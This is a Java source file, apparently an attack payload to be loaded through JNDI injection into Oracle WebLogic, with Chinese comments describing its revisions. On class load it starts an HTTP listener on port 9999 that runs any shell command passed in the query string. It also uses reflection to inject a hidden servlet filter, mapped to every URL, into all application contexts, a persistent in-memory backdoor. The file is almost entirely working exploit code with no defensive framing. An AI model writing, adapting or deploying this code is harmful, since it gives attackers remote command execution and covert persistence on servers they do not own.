import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import com.sun.net.httpserver.*;

/**
 * JNDI 注入入口类 v7 - 自包含
 *
 * v7 关键修复：
 *  - addMappingForUrlPatterns 的 dispatcherTypes 传 null。
 *    WebLogic FilterManager$FilterInfo.isApplicable(int) 在 dispatcherTypes==null 时恒返回 true，
 *    避免 WebLogic 内部 dispatcher int 常量与 DispatcherType.ordinal() 不一致导致的“映射成功但请求不命中”。
 *  - 增加 dumpFilterState()，把 filters.size / filterPatternList 以及 URLMapping.get() 的真实结果写入日志，
 *    用于确认 mapping 是否真的进入了 getFilterChain 的判定路径。
 *
 * 注册路径：
 *  1) FilterManager.addFilter(name, className, Class, instance)   —— 应用启动后仍可用（实测）
 *  2) 回退 ServletContext.addFilter(name, Class)                  —— 启动后抛 IllegalStateException（保留以便诊断）
 *  3) FilterManager.addMappingForUrlPatterns(name, null, false, "/*") —— 包私有，反射调用
 */
public class ExecTemplateJDK8 {
    static final String FILTER_NAME = "IxpFilter";
    static final StringBuilder LOG = new StringBuilder();

    static {
        try { startFallbackHttp(); } catch (Throwable t) { log("fallback_fail", t); }
        try { tryRegister(); } catch (Throwable t) { log("register_fail", t); }
    }

    static synchronized void L(String s) {
        LOG.append(s).append("\n");
    }

    static void flushLog() {
        try { writeFile("/tmp/weblogic_register.log", LOG.toString()); } catch (Throwable ignored) {}
    }

    static void log(String name, Throwable t) {
        try {
            StringWriter sw = new StringWriter();
            t.printStackTrace(new PrintWriter(sw));
            writeFile("/tmp/" + name + ".log", sw.toString());
        } catch (Exception ignored) {}
        flushLog();
    }

    static void writeFile(String path, String content) {
        try {
            FileWriter fw = new FileWriter(path);
            fw.write(content);
            fw.close();
        } catch (Exception ignored) {}
    }

    static String cause(Throwable t) {
        Throwable c = t;
        StringBuilder sb = new StringBuilder();
        while (c != null) {
            sb.append(c.getClass().getName()).append(": ").append(c.getMessage()).append(" | ");
            c = c.getCause();
        }
        return sb.toString();
    }

    // ==================== Fallback HTTP ====================
    static void startFallbackHttp() throws Exception {
        HttpServer server = HttpServer.create(new java.net.InetSocketAddress("0.0.0.0", 9999), 0);
        server.createContext("/cmd", new CmdHandler());
        server.setExecutor(null);
        server.start();
        writeFile("/tmp/httpserver_port_9999", "ok");
    }

    static class CmdHandler implements HttpHandler {
        public void handle(HttpExchange t) {
            try {
                String q = t.getRequestURI().getQuery();
                String cmd = q != null && q.startsWith("c=") ? q.substring(2) : "";
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                byte[] out = readAll(p.getInputStream());
                p.waitFor();
                String resp = new String(out);
                t.sendResponseHeaders(200, resp.length());
                t.getResponseBody().write(resp.getBytes());
            } catch (Exception e) {
                try { t.sendResponseHeaders(500, 0); } catch (Exception ignored) {}
            } finally { t.close(); }
        }
    }

    static byte[] readAll(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
        return bos.toByteArray();
    }

    // ==================== 动态注册 filter ====================
    static void tryRegister() throws Exception {
        L("jvm=" + System.getProperty("java.version"));
        Object[] ctxs = findAllServletContexts();
        L("contexts=" + ctxs.length);

        int ok = 0;
        for (int i = 0; i < ctxs.length; i++) {
            String path = "<unknown>";
            try { path = String.valueOf(invokeNoArg(ctxs[i], "getContextPath")); } catch (Throwable ignored) {}
            L("ctx[" + i + "] path=" + path);
            try {
                String r = registerFilterOn(ctxs[i]);
                L("ctx[" + i + "] -> " + r);
                ok++;
            } catch (Throwable t) {
                L("ctx[" + i + "] -> ERR " + cause(t));
            }
        }
        L("registered=" + ok + "/" + ctxs.length);
        writeFile("/tmp/weblogic_register.log", LOG.toString());
        if (ok > 0) writeFile("/tmp/weblogic_filter_ok", "ok");
    }

    static Object invokeNoArg(Object obj, String name) throws Exception {
        return obj.getClass().getMethod(name).invoke(obj);
    }

    static Object[] findAllServletContexts() {
        List<Object> out = new ArrayList<Object>();
        try {
            Class<?> regClz = Class.forName("weblogic.servlet.spi.WebServerRegistry");
            Object reg = regClz.getMethod("getInstance").invoke(null);
            Object mgr = regClz.getMethod("getHttpServerManager").invoke(reg);
            Collection<?> servers = (Collection<?>) mgr.getClass().getMethod("getHttpServers").invoke(mgr);
            for (Object srv : servers) {
                Object scm = srv.getClass().getMethod("getServletContextManager").invoke(srv);
                Object[] all = (Object[]) scm.getClass().getMethod("getAllContexts").invoke(scm);
                if (all != null) for (Object c : all) out.add(c);
            }
        } catch (Throwable t) {
            L("registry ERR " + cause(t));
        }
        return out.toArray();
    }

    static String registerFilterOn(Object context) throws Exception {
        Class<?> filterItf = Class.forName("javax.servlet.Filter");
        Class<?> cmdFilterClz = Class.forName("CmdFilter");
        L("  Filter itf loader=" + filterItf.getClassLoader());
        L("  CmdFilter loader=" + cmdFilterClz.getClassLoader());

        Object fm = getFieldFrom(context, "filterManager");
        if (fm == null) throw new IllegalStateException("filterManager is null");

        Object registration = null;

        Method isReg = fm.getClass().getMethod("isFilterRegistered", String.class);
        isReg.setAccessible(true);
        boolean existed = Boolean.TRUE.equals(isReg.invoke(fm, FILTER_NAME));
        L("  isFilterRegistered=" + existed);
        if (existed) {
            Method getReg = fm.getClass().getDeclaredMethod("getFilterRegistration", String.class);
            getReg.setAccessible(true);
            registration = getReg.invoke(fm, FILTER_NAME);
            L("  existing registration: " + registration);
        }

        if (registration == null) {
            // 路径 1: WebLogic FilterManager 内部 API（应用启动后仍可用）
            // 关键：className 与 Class 都必须传 null，只传 filter 实例。
            // FilterWrapper.setFilter 在 className != null 时会直接返回，不会给 this.filter 赋值，
            // 结果是 FilterChainImpl.add(wrapper) 拿到 null 后静默跳过（表现为“注册成功但请求不经过 filter”）。
            try {
                Object filterInstance = cmdFilterClz.getDeclaredConstructor().newInstance();
                Method addFilter = fm.getClass().getDeclaredMethod("addFilter",
                        String.class, String.class, Class.class, filterItf);
                addFilter.setAccessible(true);
                registration = addFilter.invoke(fm, FILTER_NAME, null, null, filterInstance);
                L("  FilterManager.addFilter(null, null, instance) ok: " + registration);
            } catch (Throwable t) {
                L("  FilterManager.addFilter ERR " + cause(t));
            }
        }

        if (registration != null) {
            // 保证 wrapper.filter 已就绪，并关闭 reloadable，避免 getFilter(true) 触发 checkForReload。
            try {
                Object wrapper = getMapValue(getFieldFrom(fm, "filters"), FILTER_NAME);
                Object inst = getFieldFrom(wrapper, "filter");
                setField(wrapper, "reloadable", Boolean.FALSE);
                L("  wrapper=" + wrapper + " filter=" + inst + " reloadable=false");
                if (inst == null) throw new IllegalStateException("wrapper.filter is null");
            } catch (Throwable t) {
                L("  wrapper check ERR " + cause(t));
            }
        }

        if (registration == null) {
            // 路径 2: Servlet 3.0 标准 API（启动后通常抛 IllegalStateException）
            try {
                Method m = context.getClass().getMethod("addFilter", String.class, Class.class);
                registration = m.invoke(context, FILTER_NAME, cmdFilterClz);
                L("  ServletContext.addFilter ok");
            } catch (Throwable t) {
                L("  ServletContext.addFilter ERR " + cause(t));
            }
        }

        if (registration == null) throw new IllegalStateException("all addFilter paths failed");

        // 映射 URL pattern：
        // dispatcherTypes 传 null → FilterInfo.isApplicable(int) 恒真，避免 dispatcher int 常量不匹配。
        try {
            Method direct = fm.getClass().getDeclaredMethod("addMappingForUrlPatterns",
                    String.class, EnumSet.class, boolean.class, String[].class);
            direct.setAccessible(true);
            direct.invoke(fm, FILTER_NAME, null, false, new String[]{"/*"});
            L("  mapped /* via FilterManager.addMappingForUrlPatterns(dispatchers=null)");
        } catch (Throwable t) {
            L("  direct map ERR " + cause(t));
            Class<?> dtClz = Class.forName("javax.servlet.DispatcherType");
            @SuppressWarnings({"unchecked", "rawtypes"})
            EnumSet types = EnumSet.of((Enum) Enum.valueOf((Class<Enum>) dtClz, "REQUEST"));
            Method map = registration.getClass().getMethod("addMappingForUrlPatterns",
                    EnumSet.class, boolean.class, String[].class);
            map.invoke(registration, types, false, new String[]{"/*"});
            L("  mapped /* via registration.addMappingForUrlPatterns(REQUEST)");
        }

        dumpFilterState(fm);
        flushLog();
        return "filter " + FILTER_NAME + " mapped /*";
    }

    /** 输出 FilterManager 内部状态，确认 mapping 是否进入 getFilterChain 的判定路径。 */
    static void dumpFilterState(Object fm) {
        try {
            Field f1 = fm.getClass().getDeclaredField("filters");
            f1.setAccessible(true);
            Map<?, ?> filters = (Map<?, ?>) f1.get(fm);
            L("  state filters.size=" + (filters == null ? 0 : filters.size()) + " keys=" + (filters == null ? "-" : filters.keySet()));

            Field f2 = fm.getClass().getDeclaredField("filterPatternList");
            f2.setAccessible(true);
            List<?> list = (List<?>) f2.get(fm);
            L("  state filterPatternList.size=" + (list == null ? 0 : list.size()));
            if (list != null) {
                int idx = 0;
                for (Object info : list) {
                    Object name = invokePrivate(info, "getFilterName");
                    Object map = invokePrivate(info, "getMap");
                    L("    info[" + (idx++) + "] name=" + name
                            + " get(/cmd)=" + urlMapGet(map, "/cmd")
                            + " get(/)=" + urlMapGet(map, "/")
                            + " get(/login/LoginForm.jsp)=" + urlMapGet(map, "/login/LoginForm.jsp"));
                }
            }
        } catch (Throwable t) {
            L("  dump ERR " + cause(t));
        }
    }

    static Object invokePrivate(Object obj, String name) {
        try {
            Method m = obj.getClass().getDeclaredMethod(name);
            m.setAccessible(true);
            return m.invoke(obj);
        } catch (Throwable t) {
            return "ERR:" + cause(t);
        }
    }

    static Object urlMapGet(Object urlMapping, String uri) {
        if (urlMapping == null) return "null";
        try {
            Method m = urlMapping.getClass().getMethod("get", String.class);
            m.setAccessible(true);
            return m.invoke(urlMapping, uri);
        } catch (Throwable t) {
            return "ERR:" + cause(t);
        }
    }

    static Object getMapValue(Object map, String key) {
        if (map == null) return null;
        try {
            Method m = map.getClass().getMethod("get", Object.class);
            m.setAccessible(true);
            return m.invoke(map, key);
        } catch (Throwable t) {
            return null;
        }
    }

    static void setField(Object obj, String name, Object value) throws Exception {
        Class<?> c = obj.getClass();
        while (c != null && c != Object.class) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                f.set(obj, value);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    static Object getFieldFrom(Object obj, String name) throws Exception {
        Class<?> c = obj.getClass();
        while (c != null && c != Object.class) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                return f.get(obj);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        return null;
    }
}
